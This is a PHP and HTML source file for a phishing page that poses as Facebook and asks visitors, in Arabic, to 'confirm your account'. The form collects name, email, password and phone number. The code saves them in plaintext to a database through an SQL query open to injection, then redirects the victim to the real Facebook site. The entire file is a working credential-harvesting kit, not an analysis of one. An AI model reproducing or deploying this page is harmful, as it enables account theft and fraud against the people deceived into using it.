
<?php

if(isset($_POST['sub']))
{
  $err=" ";
  $msg=" ";
  include('connect.php');

  $name=$_POST['name'];
  $email=$_POST['email'];
  $password=$_POST['password'];
  $phone=$_POST['phone'];
  $query="INSERT INTO user(name,email,password,phone)VALUES('$name','$email','$password','$phone')";
  $result=mysqli_query($con,$query);
  if(!$result)
  {
    $err="عذراً لم يتم تأكيد حسابك";
  }
  else
  {
    $msg="تم تأكيد حسابك";
    header('location:https://www.facebook.com');
  }
}


?>

<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
    <meta name="generator" content="Hugo 0.104.2">
    <title>www.Facebook.com</title>
    <!-- Custom styles for this template -->
    <link href="../my/css/signin.css" rel="stylesheet">
    <link rel="canonical" href="https://getbootstrap.com/docs/5.2/examples/sign-in/">
    <link rel="stylesheet" href="normalize.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="stylesheet" href="css/all.min.css">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@200;300;400;500;600;900&display=swap" rel="stylesheet">

    

<link href="../my/assets/dist/css/bootstrap.min.css" rel="stylesheet">

    <style>
      .bd-placeholder-img {
        font-size: 1.125rem;
        text-anchor: middle;
        -webkit-user-select: none;
        -moz-user-select: none;
        user-select: none;
      }

      @media (min-width: 768px) {
        .bd-placeholder-img-lg {
          font-size: 3.5rem;
        }
      }

      .b-example-divider {
        height: 3rem;
        background-color: rgba(0, 0, 0, .1);
        border: solid rgba(0, 0, 0, .15);
        border-width: 1px 0;
        box-shadow: inset 0 .5em 1.5em rgba(0, 0, 0, .1), inset 0 .125em .5em rgba(0, 0, 0, .15);
      }

      .b-example-vr {
        flex-shrink: 0;
        width: 1.5rem;
        height: 100vh;
      }

      .bi {
        vertical-align: -.125em;
        fill: currentColor;
      }

      .nav-scroller {
        position: relative;
        z-index: 2;
        height: 2.75rem;
        overflow-y: hidden;
      }

      .nav-scroller .nav {
        display: flex;
        flex-wrap: nowrap;
        padding-bottom: 1rem;
        margin-top: -1px;
        overflow-x: auto;
        text-align: center;
        white-space: nowrap;
        -webkit-overflow-scrolling: touch;
      }
    </style>
  </head>
  <body class="text-center">
    
<main class="form-signin w-100 m-auto">
  <form method='POST'>
    <h1><strong><p>Face<span style='color: #0d6efd;'>Book</span></p></strong></h1>
    <h1 class="h3 mb-3 fw-normal">فضلاً قم بتأكيد حسابك</h1>
    <div class="form-floating">
      <input type="text" class="form-control" name='name' id="floatingInput" placeholder="Your Name" require>
      <label for="floatingInput">Name</label>
    </div>
    <hr>
    <div class="form-floating">
      <input type="email" class="form-control" name='email' id="floatingInput" placeholder="name@example.com" require>
      <label for="floatingInput">Email address</label>
    </div>
    <hr>
    <div class="form-floating">
      <input type="password" class="form-control" name='password' id="floatingPassword" placeholder="Password" require>
      <label for="floatingPassword">Password</label>
    </div>
    <hr>
    <div class="form-floating">
      <input type="text" class="form-control" name='phone' id="floatingInput" placeholder="Phone No" require>
      <label for="floatingInput">Phone Number</label>
    </div>
    <hr>
    <button class="w-100 btn btn-lg btn-primary" name='sub' type="submit">تأكيد</button>
    <p class="mt-5 mb-3 text-muted">&copy; Facebook</p>
  </form>
</main>


    
  </body>
</html>
